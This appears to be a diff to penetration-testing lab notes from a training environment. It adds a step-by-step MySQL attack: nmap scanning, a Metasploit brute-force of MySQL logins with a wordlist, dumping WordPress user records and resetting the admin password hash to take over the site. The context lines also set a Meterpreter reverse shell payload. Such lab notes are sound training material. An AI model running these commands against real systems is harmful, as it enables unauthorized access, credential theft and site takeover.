@@ -1707,8 +1707,26 @@ Set SMBPass vagrant
 set payload windows/x64/meterpreter/reverse_tcp
 exploit
 ```
+88) Targeting MySQL Database Server
 
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p 3306 10.0.25.212
+searchsploit MySQL 5.5
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 10.0.25.212
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
+run
+mysql -u root -p -h 10.0.25.212
+show databases;
+use wordpress;
+show tables;
+select * from wp_users;
+UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
+http://<TARGET-IP>/8585/wordpress/wp-admin
 
-
+```
 
 
